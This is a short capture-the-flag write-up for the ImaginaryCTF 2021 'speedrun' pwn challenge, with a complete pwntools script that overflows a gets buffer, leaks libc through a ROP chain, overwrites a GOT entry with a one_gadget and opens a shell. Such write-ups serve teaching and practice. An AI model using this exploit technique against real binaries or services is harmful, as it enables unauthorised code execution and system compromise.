Speedrun was a nth variation of aeg type challenge,

automatic exploit generation..

the exploit only call a gets fonction for input, on stack,

and the stack buffer's size for the gets changes at each generation of the executable...

we just made a pwntools program that decode the base64 program,

read the stack buffer size from the binary, (a sub rsp,offset) instruction

then a simple puts(got entry) to get a libc leak, calculate libc base,

and a gets, to write back a onegadget entry on another got entry (setvbuf)

then we call onegadget ..and that's all

ahh yes, I did a first run to identify the remote libc, which was: libc6_2.28-10_amd64.so

that's all..

![](https://github.com/nobodyisnobody/write-ups/raw/main/Imaginary.CTF.2021/pwn/speedrun/pics/gotshell.png)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import base64

host = args.HOST or 'chal.imaginaryctf.org'
port = int(args.PORT or 42020)

io = connect(host,port)

# we receive the base64 encoded file
io.recvuntil('DATA---------------------------\n', drop=True)
encoded = io.recvuntil('----------------------------END  DATA----------------------------', drop=True)
decoded = base64.b64decode(encoded)

# write it to a temporary file
f = open('pipo.bin', 'wb')
f.write(decoded)
f.close()

exe = ELF('pipo.bin')
libc = ELF('./libc.so.6')

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

rop = ROP(exe)

# we read the stack frame size from the binary (could be a 32bit or 8bit displacement)  sub rsp,offset
temp = u8(exe.read(0x401147, 1))
if (temp == 0x81):
  size = u32(exe.read(0x401149, 4))
else:
  size = u8(exe.read(0x401149, 1))

print('stack size: '+str(size)+' ('+hex(size)+')')

# buffer on bss
buff = exe.bss(0xa00)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
gadget_ret = rop.find_gadget(['ret'])[0]

# we dump puts got entry to leak libc address then with gets, we write back a onegadget address in setvbuf got entry, then call the onegadget
payload = 'A'*size+p64(0xdeadbeef)+p64(pop_rdi)+p64(exe.got['puts'])+p64(exe.symbols['puts'])+p64(pop_rdi)+p64(exe.got['setvbuf'])+p64(exe.symbols['gets'])+p64(exe.symbols['setvbuf'])

io.sendline(payload)
io.recvuntil('Thanks!\n', drop=True)

# we recevie our libc leak address
leak = u64( io.recvuntil('\n',drop=True).ljust(8,b'\x00'))
print('leak = '+hex(leak))
libc.address = leak - libc.symbols['puts']
print('libc base = '+hex(libc.address))

# send the one gadget address
onegadgets = one_gadget('libc.so.6', libc.address)
io.sendline(p64(onegadgets[1]))

io.sendline('id;cat flag*')

io.interactive()
```
